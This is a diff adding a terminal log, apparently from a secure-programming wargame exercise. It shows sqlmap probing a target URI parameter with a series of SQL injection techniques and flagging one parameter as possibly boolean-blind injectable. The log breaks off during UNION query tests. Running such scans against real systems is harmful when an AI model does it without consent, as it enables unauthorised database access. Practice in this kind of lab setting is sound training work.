@@ -1,0 +1,43 @@
+~/secure-programming/wargame/04 root@kali-vm "CREATE SOMETHING PEOPLE WANT"
+>> ./sqlmap
+
+    sqlmap/1.0-dev - automatic SQL injection and database takeover tool
+        http://sqlmap.org
+
+        [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+        [*] starting at 14:43:59
+
+        [14:43:59] [WARNING] you've provided target URL without any GET parameters (e.g. www.site.com/article.php?id=1) and without providing any POST parameters through --data option
+        Y
+        [14:44:10] [INFO] testing connection to the target URL
+        [14:44:10] [INFO] testing if the target URL is stable. This can take a couple of seconds
+        you provided a HTTP Cookie header value. The target URL provided its own cookies within the HTTP Set-Cookie header which intersect with yours. Do you want to merge them in futher requests? [Y/n] Y
+        [14:44:22] [INFO] target URL is stable
+        [14:44:22] [INFO] testing if URI parameter '#1*' is dynamic
+        [14:44:22] [INFO] confirming that URI parameter '#1*' is dynamic
+        [14:44:22] [INFO] URI parameter '#1*' is dynamic
+        [14:44:23] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+        [14:44:23] [INFO] testing for SQL injection on URI parameter '#1*'
+        [14:44:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+        [14:44:25] [INFO] URI parameter '#1*' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
+        [14:44:35] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
+        [14:44:37] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+        [14:44:38] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'
+        [14:44:38] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+        [14:44:38] [INFO] testing 'MySQL inline queries'
+        [14:44:38] [INFO] testing 'PostgreSQL inline queries'
+        [14:44:38] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+        [14:44:38] [INFO] testing 'Oracle inline queries'
+        [14:44:38] [INFO] testing 'SQLite inline queries'
+        [14:44:38] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+        [14:44:38] [WARNING] time-based comparison requires larger statistical model, please wait...........
+        [14:44:55] [CRITICAL] there is considerable lagging in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+        [14:44:56] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
+        [14:44:56] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'
+        [14:44:56] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
+        [14:45:03] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+        [14:45:04] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'
+        [14:45:05] [INFO] testing 'Oracle AND time-based blind'
+        [14:45:06] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+        [14:45:06] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
